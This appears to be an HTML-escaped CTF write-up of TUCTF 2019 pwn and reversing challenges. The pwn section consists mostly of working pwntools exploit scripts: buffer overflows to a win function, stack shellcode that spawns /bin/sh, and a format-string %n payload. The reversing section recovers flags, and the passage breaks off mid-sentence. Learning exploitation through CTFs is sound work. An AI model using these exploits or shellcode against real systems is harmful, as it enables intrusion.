&lt;h1 id=&#34;pwn-challenges&#34;&gt;Pwn Challenges&lt;/h1&gt;
&lt;h2 id=&#34;thefirst---379-pts&#34;&gt;thefirst - 379 pts&lt;/h2&gt;
&lt;p&gt;We can see in the image below that &lt;code&gt;gets&lt;/code&gt; is being used to take the input. Hence it can be exploited for &lt;em&gt;buffer overflow&lt;/em&gt;. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/thefirst_1.png&#34; data-caption=&#34;Disassembly of main&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/thefirst_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Disassembly of main
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;This can be done using &lt;code&gt;pattern create 50&lt;/code&gt; and then using that pattern to find the crash offset.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/gef_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/gef_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/gef_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/gef_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Also inspecting the functions, we see that there is a &lt;code&gt;printFlag&lt;/code&gt; function at 0x80491f6. So, our objective is to jump there.&lt;/p&gt;
&lt;p&gt;The following script is the exploit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./thefirst&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# p = remote(&amp;#34;chal.tuctf.com&amp;#34;, 30508)&lt;/span&gt;
print_flag_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80491f6&lt;/span&gt;
offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BBBB&amp;#34;&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(print_flag_addr)

f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;shellme32---462-pts&#34;&gt;shellme32 - 462 pts&lt;/h2&gt;
&lt;p&gt;On running the program, we are given an address and we have to provide some input. On analysing it using GDB, and using &lt;code&gt;vmmap&lt;/code&gt;, we find that the adress given to us is that of the stack and the stack is read, write and executable.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/shellme32_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/shellme32_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;We use &lt;a href=&#34;http://shell-storm.org/shellcode/files/shellcode-811.php&#34;&gt;shell-storm&lt;/a&gt; to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with &amp;lsquo;A&amp;rsquo;s and then provide the address to write to, i.e. the adress provided to us.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
len_shell_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./shellme32&amp;#34;&lt;/span&gt;)

offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;


p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;)

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Stack Address: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(hex(addr)))

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shellcode
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; len_shell_code)

payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(len(shellcode))
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;shellme64---480-pts&#34;&gt;shellme64 - 480 pts&lt;/h2&gt;
&lt;p&gt;This is similar to the shellme32 challenge. We just replace the shellcode with a x64 shellcode. And  replace &lt;code&gt;p32&lt;/code&gt; with &lt;code&gt;p64&lt;/code&gt; when adding the stack address to the payload.&lt;/p&gt;
&lt;p&gt;We use &lt;a href=&#34;https://www.exploit-db.com/exploits/42179&#34;&gt;exploit-db&lt;/a&gt; to get the shellcode. The offset of the crash is same as before.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
len_shell_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./shellme64&amp;#34;&lt;/span&gt;)

offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;


p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;this&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;)

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Stack Address: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(hex(addr)))

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shellcode
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; len(shellcode))

&lt;span style=&#34;color:#75715e&#34;&gt;# with open(&amp;#39;payload&amp;#39;, &amp;#39;wb&amp;#39;) as f:&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#     f.write(payload)&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(addr)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;printfun---500-pts&#34;&gt;printfun - 500 pts&lt;/h2&gt;
&lt;p&gt;Here, on analysing with Ghidra, we find that there is a format string vulnerability.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/printfun_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/printfun_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;So, here first we use GDB to get the addresses of the two buffers being compared. Also, as input if we provide &lt;code&gt;&amp;quot;%x %x %x %x %x %x %x %x %x %x %x %x %x %x&amp;quot;&lt;/code&gt;, for the instance running on GDB we get this output -&lt;/p&gt;
&lt;p&gt;&lt;code&gt;5655a050 3c 14 1 ffffc994 5655a050 5655a008 ffffc900 0 0 f7e06637 f7fa0000 f7fa0000 0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;On seeing the values displayed by GDB, we see two addresses - &lt;code&gt;0x5655a008&lt;/code&gt; and &lt;code&gt;0x5655a050&lt;/code&gt;&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/printfun_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/printfun_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;This is intereting as both these addresses are also present in the program&amp;rsquo;s output with our input.&lt;/p&gt;
&lt;p&gt;So, all we have to do is overwrite the 6th and 7th &amp;ldquo;addresses&amp;rdquo; of the output to the same value so that the string comparison passes.&lt;/p&gt;
&lt;p&gt;We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now :frowning_face:) -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;printfun&amp;#34;&lt;/span&gt;)

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AAAA%6$n%7$n&amp;#34;&lt;/span&gt;

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;? &amp;#39;&lt;/span&gt;, payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id=&#34;rev-challenges&#34;&gt;Rev Challenges&lt;/h1&gt;
&lt;h2 id=&#34;faker---400-pts&#34;&gt;faker - 400 pts&lt;/h2&gt;
&lt;p&gt;If we open the binary in Ghidra, we see that there are calls to different functions, namely &lt;em&gt;A&lt;/em&gt;, &lt;em&gt;B&lt;/em&gt; and &lt;em&gt;C&lt;/em&gt;, which depend on the user input. But on trying them, we get fake flags.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;But all of them have a common structure, they have a call to &lt;code&gt;printFlag&lt;/code&gt; with a string.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Also in the functions list, we see that there is a function named &lt;code&gt;thisone&lt;/code&gt;. First we take a look at &lt;code&gt;printFlag&lt;/code&gt; function.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;There can be two ways to solve this challenge.&lt;/p&gt;
&lt;h3 id=&#34;method-1---static&#34;&gt;Method 1 - Static&lt;/h3&gt;
&lt;p&gt;Write a script to emulate the functionality of the &lt;code&gt;printFlag&lt;/code&gt; function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;printFlag&lt;/span&gt;(s):
    s2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(s)):
        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((((ord(s[i]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1d&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5f&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;
        s2 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(x)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(s2)

printFlag(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;PJ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gives us the flag - &lt;code&gt;TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;method-2---dynamic&#34;&gt;Method 2 - Dynamic&lt;/h3&gt;
&lt;p&gt;Here set a breakpoint in main and then run the following commads in GDB.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; info functions  &lt;span style=&#34;color:#75715e&#34;&gt;# get address of printFlag function&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; set $rip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x000055555555534b   &lt;span style=&#34;color:#75715e&#34;&gt;# i.e. to the address of the function&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will print the flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;core---400-pts&#34;&gt;core - 400 pts&lt;/h2&gt;
&lt;p&gt;We a re provided a core dump and a C file. The C file looks like this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;  // prints&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt; // malloc&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt; // strcmp&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt; // read&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;  // open&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt; // close&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;time.h&amp;gt;   // time&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define FLAG_LEN 64
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; flag[FLAG_LEN];

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;str, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len) {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
		str[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
	}
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
    setvbuf(stdout, NULL, _IONBF, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;);
    setvbuf(stdin, NULL, _IONBF, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;);

	&lt;span style=&#34;color:#75715e&#34;&gt;// Read the flag
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	memset(flag, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, FLAG_LEN);
	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;);
	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, flag, FLAG_LEN);

	xor(flag, len);

	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
	read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Basically we are XORing the input string with 1. We assume that flag is in the standard format, i.e. begins with &lt;code&gt;TUCTF&lt;/code&gt;. So we pre-calculate, the starting of the string that should be in memory.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;TUCTF&lt;/code&gt; =&amp;gt; &lt;code&gt;UTBUG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We use &lt;code&gt;xxd&lt;/code&gt; to view the core.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/core.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/core.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;We find something interesting in the memory. On decoding&lt;/p&gt;
